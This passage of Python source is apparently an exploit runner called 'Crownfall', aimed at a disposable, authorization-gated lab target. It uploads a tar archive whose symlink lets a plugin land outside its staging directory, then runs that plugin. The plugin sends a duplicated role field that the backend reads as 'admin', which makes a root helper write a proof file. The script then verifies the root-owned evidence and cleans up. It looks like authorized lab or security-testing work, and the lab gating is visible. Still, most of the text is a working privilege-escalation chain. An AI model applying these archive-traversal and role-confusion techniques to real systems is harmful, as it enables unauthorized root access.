        if require_string(obj, "bundle_sha256", label="bundle response", pattern=HEX64_RE) != material.bundle_sha256:
            raise VerificationError("target bundle digest does not match the sent archive")
        if require_integer(obj, "bundle_size", label="bundle response") != len(material.bundle):
            raise VerificationError("target bundle size does not match the sent archive")
        members = obj.get("members")
        if not isinstance(members, list) or len(members) != 3:
            raise VerificationError(f"target observed unexpected archive members: {members!r}")
        if not all(isinstance(item, dict) for item in members):
            raise VerificationError("target archive evidence contains a non-object member")
        member_names = [item.get("name") for item in members]
        if member_names != list(material.bundle_members):
            raise VerificationError(f"target observed unexpected member names: {member_names!r}")
        if [item.get("type") for item in members] != ["directory", "symlink", "regular"]:
            raise VerificationError("target observed an unexpected archive member ordering or type")
        if members[1].get("linkname") != PLUGIN_SYMLINK_TARGET:
            raise VerificationError("target observed an unexpected archive symlink target")
        if members[1].get("realpath_after") != PLUGIN_DESTINATION:
            raise VerificationError("archive symlink did not resolve to the fixed plugin directory")
        if members[2].get("realpath_after") != PLUGIN_DESTINATION + "/" + PLUGIN_NAME:
            raise VerificationError("archive file did not resolve to the fixed plugin destination")
        if members[2].get("size") != len(material.plugin):
            raise VerificationError("target observed an unexpected plugin member size")
        if members[2].get("sha256") != material.plugin_sha256:
            raise VerificationError("target observed an unexpected plugin member digest")
        plugin = require_object(obj.get("plugin"), label="bundle response.plugin")
        plugin_hash = require_string(plugin, "sha256", label="bundle response.plugin", pattern=HEX64_RE)
        if plugin_hash != material.plugin_sha256:
            raise VerificationError("target plugin digest does not match generated source")
        realpath = require_string(plugin, "realpath", label="bundle response.plugin", maximum=256)
        if realpath != PLUGIN_DESTINATION + "/" + PLUGIN_NAME:
            raise VerificationError(f"plugin landed at an unexpected real path: {realpath}")
        if plugin.get("path") != realpath or plugin.get("archive_realpath") != realpath:
            raise VerificationError("plugin path evidence does not converge on one fixed destination")
        if plugin.get("archive_member") != material.bundle_members[2]:
            raise VerificationError("plugin evidence names an unexpected archive member")
        if plugin.get("mode") != "0600":
            raise VerificationError("landed plugin mode is not 0600")
        symlink_followed = require_boolean(plugin, "symlink_followed", label="bundle response.plugin")
        if not symlink_followed:
            raise VerificationError("target did not report the archive symlink traversal")
        if plugin.get("landed_outside_staging") is not True:
            raise VerificationError("target did not prove that the plugin landed outside staging")
        self.observed["bundle"] = obj
        return obj

    def activate(self, material: AttackMaterial) -> dict[str, Any]:
        self.deadline.check("plugin activation")
        body = encode_json_document(
            {
                "plugin_name": PLUGIN_NAME,
                "plugin_sha256": material.plugin_sha256,
                "proof_nonce": material.proof_nonce,
            }
        )
        response = self.protocol.request(
            "POST",
            ACTIVATE_PATH,
            body=body,
            content_type="application/json",
            event="plugin_activated",
        )
        expect_status(response, {200}, stage="plugin activation")
        obj = response.json_object(label="activation response")
        if require_boolean(obj, "ok", label="activation response") is not True:
            raise VerificationError("activation response did not report success")
        execution = require_object(obj.get("execution"), label="activation response.execution")
        exit_code = require_integer(execution, "returncode", label="activation response.execution")
        if exit_code != 0:
            raise VerificationError(f"plugin process did not exit successfully: {exit_code}")
        if execution.get("stderr") != "":
            raise VerificationError("plugin wrote unexpected data to stderr")
        report = require_object(execution.get("report"), label="activation response.execution.report")
        self._verify_plugin_report(report, material, execution)

        direct = require_object(
            obj.get("direct_write_control"),
            label="activation response.direct_write_control",
        )
        self._verify_direct_write(direct, label="target direct-write control")
        if direct.get("application_euid") != 10001 or direct.get("application_egid") != 10001:
            raise VerificationError("target direct-write control did not run as the application identity")
        root_parent = require_object(
            direct.get("root_parent"),
            label="activation response.direct_write_control.root_parent",
        )
        self._verify_root_parent(root_parent)

        keeper_result = require_object(obj.get("result"), label="activation response.result")
        self._verify_keeper_result(
            keeper_result,
            material,
            expected_peer_pid=require_integer(report, "plugin_pid", label="plugin report"),
            allow_result_file=False,
        )
        duplicate = require_object(report.get("duplicate_attack"), label="plugin report.duplicate_attack")
        duplicate_without_file = dict(duplicate)
        duplicate_without_file.pop("result_file", None)
        if duplicate_without_file != keeper_result:
            raise VerificationError("plugin keeper reply differs from the stored root result")
        self.observed["activation"] = obj
        return obj

    @staticmethod
    def _verify_direct_write(direct: Mapping[str, Any], *, label: str) -> None:
        if direct.get("attempted") is not True:
            raise VerificationError(f"{label} did not record an attempt")
        if direct.get("allowed") is not False:
            raise VerificationError(f"{label} unexpectedly crossed the root directory boundary")
        direct_errno = direct.get("errno")
        if isinstance(direct_errno, bool) or direct_errno not in {errno.EACCES, errno.EPERM}:
            raise VerificationError(f"{label} failed for an unexpected reason: {direct_errno}")

    @staticmethod
    def _verify_root_parent(root_parent: Mapping[str, Any]) -> None:
        if root_parent.get("path") != PROOF_DESTINATION:
            raise VerificationError("root proof parent path is unexpected")
        if root_parent.get("uid") != 0 or root_parent.get("gid") != 0:
            raise VerificationError("root proof parent ownership is unexpected")
        if root_parent.get("mode") != "0700":
            raise VerificationError("root proof parent mode is not 0700")

    def _verify_plugin_report(
        self,
        report: Mapping[str, Any],
        material: AttackMaterial,
        execution: Mapping[str, Any],
    ) -> None:
        required = {
            "plugin_pid",
            "plugin_uid",
            "plugin_euid",
            "plugin_gid",
            "plugin_egid",
            "proof_nonce",
            "plugin_sha256",
            "direct_write",
            "clean_control",
            "duplicate_attack",
        }
        if set(report) != required:
            raise VerificationError("plugin report fields differ from the fixed protocol")
        plugin_pid = require_integer(report, "plugin_pid", label="plugin report")
        if plugin_pid <= 1 or execution.get("child_pid") != plugin_pid:
            raise VerificationError("plugin report PID does not match the launched child")
        for key in ("plugin_uid", "plugin_euid", "plugin_gid", "plugin_egid"):
            if require_integer(report, key, label="plugin report") != 10001:
                raise VerificationError(f"plugin report {key} is not the application identity")
        if report.get("proof_nonce") != material.proof_nonce:
            raise VerificationError("plugin report proof nonce does not match activation")
        if report.get("plugin_sha256") != material.plugin_sha256:
            raise VerificationError("plugin report digest does not match activation")

        direct = require_object(report.get("direct_write"), label="plugin report.direct_write")
        self._verify_direct_write(direct, label="plugin direct-write control")
        expected_path = PROOF_DESTINATION + "/" + material.proof_nonce + ".proof"
        if direct.get("path") != expected_path:
            raise VerificationError("plugin direct-write control used an unexpected path")
        clean = require_object(report.get("clean_control"), label="plugin report.clean_control")
        if clean != {"error": "backend_role_denied", "ok": False}:
            raise VerificationError("clean guest keeper request did not receive the exact denial")
        duplicate = require_object(report.get("duplicate_attack"), label="plugin report.duplicate_attack")
        self._verify_keeper_result(
            duplicate,
            material,
            expected_peer_pid=plugin_pid,
            allow_result_file=True,
        )

    def _verify_keeper_result(
        self,
        result: Mapping[str, Any],
        material: AttackMaterial,
        *,
        expected_peer_pid: int,
        allow_result_file: bool,
    ) -> dict[str, Any]:
        if result.get("ok") is not True or result.get("schema") != 1:
            raise VerificationError("keeper result did not report schema-1 success")
        if result.get("operation") != "write_proof":
            raise VerificationError("keeper performed an unexpected operation")
        if result.get("lab_id") != self.authorization.lab_id:
            raise VerificationError("keeper result has the wrong lab identifier")
        if result.get("proof_nonce") != material.proof_nonce:
            raise VerificationError("keeper result has the wrong proof nonce")
        if result.get("plugin_sha256") != material.plugin_sha256:
            raise VerificationError("keeper result has the wrong plugin digest")
        created_at = require_string(result, "created_at", label="keeper result", maximum=64)

        keeper = require_object(result.get("keeper"), label="keeper result.keeper")
        keeper_pid = require_integer(keeper, "pid", label="keeper result.keeper")
        if keeper_pid <= 1:
            raise VerificationError("keeper PID is invalid")
        for key in ("uid", "euid", "gid", "egid"):
            if require_integer(keeper, key, label="keeper result.keeper") != 0:
                raise VerificationError(f"keeper {key} does not prove the root identity")

        peer = require_object(result.get("peer"), label="keeper result.peer")
        if peer.get("pid") != expected_peer_pid:
            raise VerificationError("keeper peer PID does not match the activated plugin")
        if peer.get("uid") != 10001 or peer.get("gid") != 10001:
            raise VerificationError("keeper peer credentials do not match the application identity")

        policy = require_object(result.get("policy"), label="keeper result.policy")
        if policy != {
            "first_role": "guest",
            "backend_role": "admin",
            "role_occurrences": 2,
        }:
            raise VerificationError("keeper did not record the expected duplicate-role interpretation")

        root_parent = require_object(result.get("root_parent"), label="keeper result.root_parent")
        self._verify_root_parent(root_parent)

        proof = require_object(result.get("proof"), label="keeper result.proof")
        expected_name = material.proof_nonce + ".proof"
        expected_path = PROOF_DESTINATION + "/" + expected_name
        if proof.get("path") != expected_path or proof.get("name") != expected_name:
            raise VerificationError("keeper proof path is unexpected")
        if proof.get("uid") != 0 or proof.get("gid") != 0:
            raise VerificationError("keeper proof ownership is not root:root")
        if proof.get("mode") != "0600":
            raise VerificationError("keeper proof mode is not 0600")
        proof_hash = require_string(proof, "sha256", label="keeper result.proof", pattern=HEX64_RE)
        proof_record = {
            "schema": 1,
            "service": MANIFEST_SERVICE,
            "lab_id": self.authorization.lab_id,
            "proof_nonce": material.proof_nonce,
            "plugin_sha256": material.plugin_sha256,
            "created_at": created_at,
            "keeper_pid": keeper_pid,
            "keeper_uid": 0,
            "keeper_euid": 0,
        }
        expected_proof_bytes = encode_json_document(proof_record) + b"\n"
        if proof_hash != sha256_hex(expected_proof_bytes):
            raise VerificationError("keeper proof digest does not match its canonical root record")
        if proof.get("size") != len(expected_proof_bytes):
            raise VerificationError("keeper proof size does not match its canonical root record")

        result_file = result.get("result_file")
        if allow_result_file:
            result_file_obj = require_object(result_file, label="keeper result.result_file")
            expected_result_path = RESULT_DESTINATION + "/" + material.proof_nonce + ".json"
            if result_file_obj.get("path") != expected_result_path:
                raise VerificationError("keeper result-file path is unexpected")
            if result_file_obj.get("uid") != 0 or result_file_obj.get("gid") != 10001:
                raise VerificationError("keeper result-file ownership is unexpected")
            if result_file_obj.get("mode") != "0640":
                raise VerificationError("keeper result-file mode is not 0640")
        elif result_file is not None:
            raise VerificationError("stored keeper result unexpectedly contains recursive file evidence")
        return {
            "created_at": created_at,
            "keeper_pid": keeper_pid,
            "proof_path": expected_path,
            "proof_sha256": proof_hash,
        }

    def poll_result(self, proof_nonce: str) -> dict[str, Any]:
        poll_deadline = min(time.monotonic() + self.poll_timeout, time.monotonic() + self.deadline.remaining())
        raw_path = RESULT_PATH + "?proof_nonce=" + proof_nonce
        attempts = 0
        while True:
            self.deadline.check("result polling")
            attempts += 1
            response = self.protocol.request(
                "GET",
                raw_path,
                event="result_polled",
            )
            if response.status == 200:
                obj = response.json_object(label="result response")
                if require_boolean(obj, "ok", label="result response") is not True:
                    raise VerificationError("result response did not report success")
                self.timeline.add("result_ready", attempts=attempts)
                self.observed["result_endpoint"] = obj
                return obj
            if response.status != 404:
                expect_status(response, {200, 404}, stage="result polling")
            if time.monotonic() >= poll_deadline:
                raise RunDeadlineExceeded("proof result did not become ready before the poll deadline")
            time.sleep(min(self.poll_interval, max(0.0, poll_deadline - time.monotonic())))

    def verify_result(self, document: Mapping[str, Any], material: AttackMaterial) -> dict[str, Any]:
        result = require_object(document.get("result"), label="result response.result")
        activation = require_object(self.observed.get("activation"), label="observed activation")
        execution = require_object(activation.get("execution"), label="activation execution")
        report = require_object(execution.get("report"), label="activation plugin report")
        plugin_pid = require_integer(report, "plugin_pid", label="activation plugin report")
        verified_keeper = self._verify_keeper_result(
            result,
            material,
            expected_peer_pid=plugin_pid,
            allow_result_file=False,
        )
        activation_result = require_object(activation.get("result"), label="activation result")
        if result != activation_result:
            raise VerificationError("polled root result differs from the activation result")

        result_file = require_object(document.get("result_file"), label="result response.result_file")
        expected_result_path = RESULT_DESTINATION + "/" + material.proof_nonce + ".json"
        if result_file.get("path") != expected_result_path:
            raise VerificationError("result endpoint returned an unexpected result-file path")
        if result_file.get("uid") != 0 or result_file.get("gid") != 10001:
            raise VerificationError("result endpoint file ownership is unexpected")
        if result_file.get("mode") != "0640":
            raise VerificationError("result endpoint file mode is not 0640")
        stored_bytes = encode_json_document(result) + b"\n"
        if result_file.get("sha256") != sha256_hex(stored_bytes):
            raise VerificationError("result endpoint file digest does not match its JSON evidence")
        if result_file.get("size") != len(stored_bytes):
            raise VerificationError("result endpoint file size does not match its JSON evidence")

        direct = require_object(report.get("direct_write"), label="activation plugin direct_write")
        verified = {
            "plugin_pid": plugin_pid,
            "plugin_euid": 10001,
            "direct_write_allowed": False,
            "direct_write_errno": direct.get("errno"),
            "clean_guest_denied": True,
            "duplicate_role_accepted": True,
            "policy_first_role": "guest",
            "policy_backend_role": "admin",
            "role_occurrences": 2,
            "keeper_operation": "write_proof",
            "keeper_uid": 0,
            "root_parent_mode": "0700",
            "root_proof_uid": 0,
            "root_proof_mode": "0600",
            "root_proof_path": verified_keeper["proof_path"],
            "root_proof_sha256": verified_keeper["proof_sha256"],
            "root_result_uid": 0,
            "root_result_mode": "0640",
            "root_result_sha256": result_file.get("sha256"),
            "proof_nonce": material.proof_nonce,
            "plugin_sha256": material.plugin_sha256,
        }
        self.timeline.add("root_proof_verified", **verified)
        self.observed["verified_evidence"] = verified
        return verified

    def cleanup(self, material: AttackMaterial, *, failure_cleanup: bool = False) -> dict[str, Any]:
        self.cleanup_evidence["attempted"] = True
        body = encode_json_document(
            {
                "plugin_sha256": material.plugin_sha256,
                "proof_nonce": material.proof_nonce,
            }
        )
        response = self.protocol.request(
            "POST",
            CLEANUP_PATH,
            body=body,
            content_type="application/json",
            event="failure_cleanup_requested" if failure_cleanup else "cleanup_requested",
        )
        if failure_cleanup and response.status == 404:
            error = response_error_code(response)
            if error not in {"proof_not_found", "result_not_found"}:
                raise VerificationError(
                    f"failure cleanup returned an unexpected absence error: {error}"
                )
            raw_path = RESULT_PATH + "?proof_nonce=" + material.proof_nonce
            absent = self.protocol.request("GET", raw_path, event="failure_cleanup_absence_checked")
            if absent.status != 404:
                raise VerificationError(
                    f"failure cleanup absence was not stable; result status={absent.status}"
                )
            self.cleanup_evidence = {
                "attempted": True,
                "verified": True,
                "best_effort": True,
                "already_absent": True,
                "cleanup_status": response.status,
                "cleanup_error": error,
                "result_after_cleanup_status": absent.status,
            }
            self.timeline.add(
                "failure_cleanup_verified_absent",
                cleanup_status=response.status,
                result_status=absent.status,
            )
            return self.cleanup_evidence
        expect_status(response, {200}, stage="cleanup")
        obj = response.json_object(label="cleanup response")
        if require_boolean(obj, "ok", label="cleanup response") is not True:
            raise VerificationError("cleanup response did not report success")
        if obj.get("result_absent") is not True:
            raise VerificationError("cleanup did not confirm absence of the root result")
        removed = require_object(obj.get("removed"), label="cleanup response.removed")
        if not failure_cleanup and removed.get("plugin") is not True:
            raise VerificationError("cleanup did not remove the landed plugin")
        if failure_cleanup and not isinstance(removed.get("plugin"), bool):
            raise VerificationError("failure cleanup plugin-removal evidence is malformed")
        staging_entries = removed.get("staging_entries")
        minimum_staging = 0 if failure_cleanup else 1
        if (
            isinstance(staging_entries, bool)
            or not isinstance(staging_entries, int)
            or staging_entries < minimum_staging
        ):
            raise VerificationError("cleanup did not remove the staging entries")
        extra_entries = removed.get("extra_plugin_entries")
        if isinstance(extra_entries, bool) or not isinstance(extra_entries, int) or extra_entries != 0:
            raise VerificationError("cleanup observed unexpected extra plugin entries")

        keeper = require_object(obj.get("keeper"), label="cleanup response.keeper")
        if failure_cleanup and obj.get("partial_run") is True:
            if keeper != {"ok": False, "error": "proof_not_found"}:
                raise VerificationError("partial cleanup returned unexpected keeper evidence")
            raw_path = RESULT_PATH + "?proof_nonce=" + material.proof_nonce
            absent = self.protocol.request("GET", raw_path, event="failure_cleanup_absence_checked")
            if absent.status != 404:
                raise VerificationError(
                    f"partial cleanup result remained reachable; status={absent.status}"
                )
            self.cleanup_evidence = {
                "attempted": True,
                "verified": True,
                "best_effort": True,
                "partial_run": True,
                "keeper": keeper,
                "removed": removed,
                "result_absent": True,
                "result_after_cleanup_status": absent.status,
            }
            self.timeline.add(
                "failure_cleanup_verified_partial_run",
                plugin_removed=removed.get("plugin"),
                staging_entries=staging_entries,
                result_status=absent.status,
            )
            return obj
        if obj.get("partial_run") is not None:
            raise VerificationError("successful proof cleanup unexpectedly reports a partial run")
        if keeper.get("ok") is not True or keeper.get("schema") != 1:
            raise VerificationError("cleanup keeper operation did not report schema-1 success")
        if keeper.get("operation") != "delete_proof":
            raise VerificationError("cleanup keeper performed an unexpected operation")
        if keeper.get("lab_id") != self.authorization.lab_id:
            raise VerificationError("cleanup keeper lab identifier is unexpected")
        if keeper.get("proof_nonce") != material.proof_nonce:
            raise VerificationError("cleanup keeper proof nonce is unexpected")
        if keeper.get("plugin_sha256") != material.plugin_sha256:
            raise VerificationError("cleanup keeper plugin digest is unexpected")
        identity = require_object(keeper.get("keeper"), label="cleanup keeper.identity")
        for key in ("uid", "euid", "gid", "egid"):
            if identity.get(key) != 0:
                raise VerificationError(f"cleanup keeper {key} does not prove root identity")
        peer = require_object(keeper.get("peer"), label="cleanup keeper.peer")
        if peer.get("uid") != 10001 or peer.get("gid") != 10001:
            raise VerificationError("cleanup keeper peer is not the application identity")
        policy = require_object(keeper.get("policy"), label="cleanup keeper.policy")
        if policy != {"first_role": "guest", "backend_role": "admin", "role_occurrences": 2}:
            raise VerificationError("cleanup keeper policy evidence is unexpected")
        deleted = require_object(keeper.get("deleted"), label="cleanup keeper.deleted")
        if not failure_cleanup and deleted != {"proof": True, "result": True}:
            raise VerificationError("cleanup keeper did not delete both root files")
        if failure_cleanup and (
            set(deleted) != {"proof", "result"}
            or not all(isinstance(value, bool) for value in deleted.values())
        ):
            raise VerificationError("failure cleanup keeper deletion evidence is malformed")
        if keeper.get("proof_exists_after") is not False or keeper.get("result_exists_after") is not False:
            raise VerificationError("cleanup keeper still observes root artifacts")
        proof_before = require_object(keeper.get("proof_before"), label="cleanup keeper.proof_before")
        prior_verified = self.observed.get("verified_evidence")
        if isinstance(prior_verified, dict):
            if proof_before.get("path") != prior_verified.get("root_proof_path"):
                raise VerificationError("cleanup removed a different proof path")
            if proof_before.get("sha256") != prior_verified.get("root_proof_sha256"):
                raise VerificationError("cleanup removed a proof with a different digest")
        else:
            expected_path = PROOF_DESTINATION + "/" + material.proof_nonce + ".proof"
            if proof_before.get("path") != expected_path:
                raise VerificationError("failure cleanup removed an unexpected proof path")
            proof_hash = proof_before.get("sha256")
            if not isinstance(proof_hash, str) or HEX64_RE.fullmatch(proof_hash) is None:
                raise VerificationError("failure cleanup proof digest is malformed")

        raw_path = RESULT_PATH + "?proof_nonce=" + material.proof_nonce
        absent = self.protocol.request("GET", raw_path, event="cleanup_absence_checked")
        if absent.status != 404:
            raise VerificationError(
                f"result remained reachable after cleanup; status={absent.status}"
            )
        self.cleanup_evidence = {
            "attempted": True,
            "verified": True,
            "keeper_deleted": deleted,
            "removed": removed,
            "result_absent": True,
            "result_after_cleanup_status": absent.status,
            "response": obj,
        }
        self.timeline.add("cleanup_verified", result_status=absent.status)
        return obj

    @staticmethod
    def _benign_bundle() -> bytes:
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w", format=tarfile.USTAR_FORMAT) as archive:
            item = _tar_info("control/", mode=0o755, type_=tarfile.DIRTYPE)
            archive.addfile(item)
        return buffer.getvalue()

    def execute(self) -> RunReport:
        started = time.monotonic()
        material: AttackMaterial | None = None
        bundle_attempted = False
        completed = False
        try:
            self.verify_manifest()
            material = make_attack_material()
            self.timeline.add(
                "attack_material_built",
                proof_nonce=material.proof_nonce,
                plugin_bytes=len(material.plugin),
                plugin_sha256=material.plugin_sha256,
                bundle_bytes=len(material.bundle),
                bundle_sha256=material.bundle_sha256,
                members=list(material.bundle_members),
            )

            self.control_direct_protected_route(self._benign_bundle())
            self.control_bad_mac(secrets.token_hex(16))
            self.control_replay(secrets.token_hex(16))

            bundle_attempted = True
            self.upload_bundle(material)
            self.activate(material)
            result = self.poll_result(material.proof_nonce)
            self.verify_result(result, material)
            self.cleanup(material)
            completed = True
        finally:
            if (
                not completed
                and bundle_attempted
                and material is not None
            ):
                try:
                    self.cleanup(material, failure_cleanup=True)
                except CrownfallError as cleanup_error:
                    self.cleanup_evidence = {
                        "attempted": True,
                        "verified": False,
                        "failure": str(cleanup_error),
                    }
                    self.timeline.add("failure_cleanup_failed", error=str(cleanup_error))

        expectations = {
            "direct_admin_status": 403,
            "bad_mac_status": 401,
            "replayed_signature_status": 409,
            "ambiguous_route_bundle_status": 201,
            "plugin_euid": 10001,
            "direct_root_write": "EACCES_or_EPERM",
            "clean_guest_keeper_request": "backend_role_denied",
            "duplicate_role_keeper_request": "accepted_as_admin",
            "keeper_operation": "write_proof",
            "proof_uid": 0,
            "proof_mode": "0600",
            "cleanup_result_status": 404,
        }
        return RunReport(
            program=PROGRAM,
            protocol=PROTOCOL_VERSION,
            success=True,
            lab_id=self.authorization.lab_id,
            authorized_base_url=self.endpoint.base_url,
            pinned_peer_ip=self.endpoint.pinned_ip,
            target_fingerprint=self.authorization.target_fingerprint,
            expectations=expectations,
            observed=self.observed,
            controls=self.controls,
            cleanup=self.cleanup_evidence,
            timeline=[asdict(item) for item in self.timeline.events],
            elapsed_ms=round((time.monotonic() - started) * 1000.0, 3),
        )


def bounded_float(minimum: float, maximum: float):
    def parse(value: str) -> float:
        try:
            number = float(value)
        except ValueError as exc:
            raise argparse.ArgumentTypeError("must be a number") from exc
        if not (minimum <= number <= maximum):
            raise argparse.ArgumentTypeError(f"must be between {minimum} and {maximum}")
        return number

    return parse


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog=PROGRAM,
        allow_abbrev=False,
        description=(
            "Run the fixed Crownfall exploit chain against one disposable target "
            "described by its authorization JSON."
        ),
    )
    parser.add_argument(
        "--authorization",
        required=True,
        type=Path,
        metavar="FILE",
        help="authorization JSON emitted by the disposable target",
    )
    parser.add_argument(
        "--i-own-this-lab",
        required=True,
        action="store_true",
        help="confirm ownership and authorization for this disposable lab",
    )
    parser.add_argument(
        "--request-timeout",
        type=bounded_float(1.0, 15.0),
        default=5.0,
        metavar="SECONDS",
        help="per-request socket timeout, 1..15 (default: 5)",
    )
    parser.add_argument(
        "--total-timeout",
        type=bounded_float(10.0, 120.0),
        default=45.0,
        metavar="SECONDS",
        help="total run deadline, 10..120 (default: 45)",
    )
    parser.add_argument(
        "--poll-timeout",
        type=bounded_float(1.0, 30.0),
        default=10.0,
        metavar="SECONDS",
        help="maximum proof-result wait, 1..30 (default: 10)",
    )
    parser.add_argument(
        "--poll-interval",
        type=bounded_float(0.05, 2.0),
        default=0.2,
        metavar="SECONDS",
        help="proof polling interval, 0.05..2 (default: 0.2)",
    )
    parser.add_argument(
        "--quiet",
        action="store_true",
        help="suppress the progress timeline on stderr; final JSON is unchanged",
    )
    return parser


def render_failure(error: Exception, *, started: float) -> str:
    return json.dumps(
        {
            "program": PROGRAM,
            "protocol": PROTOCOL_VERSION,
            "success": False,
            "error_type": type(error).__name__,
            "error": str(error),
            "elapsed_ms": round((time.monotonic() - started) * 1000.0, 3),
        },
        ensure_ascii=True,
        allow_nan=False,
        sort_keys=True,
        indent=2,
    )


def main(argv: Sequence[str] | None = None) -> int:
    started = time.monotonic()
    parser = build_parser()
    args = parser.parse_args(argv)
    try:
        authorization = Authorization.load(args.authorization)
        endpoint = Endpoint.from_authorization(authorization.base_url)
        runner = CrownfallRun(
            authorization,
            endpoint,
            request_timeout=args.request_timeout,
            total_timeout=args.total_timeout,
            poll_timeout=args.poll_timeout,
            poll_interval=args.poll_interval,
            quiet=args.quiet,
        )
        report = runner.execute()
    except (CrownfallError, OSError, ValueError) as exc:
        print(render_failure(exc, started=started), file=sys.stderr)
        return 1
    print(
        json.dumps(
            asdict(report),
            ensure_ascii=True,
            allow_nan=False,
            sort_keys=True,
            indent=2,
        )
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
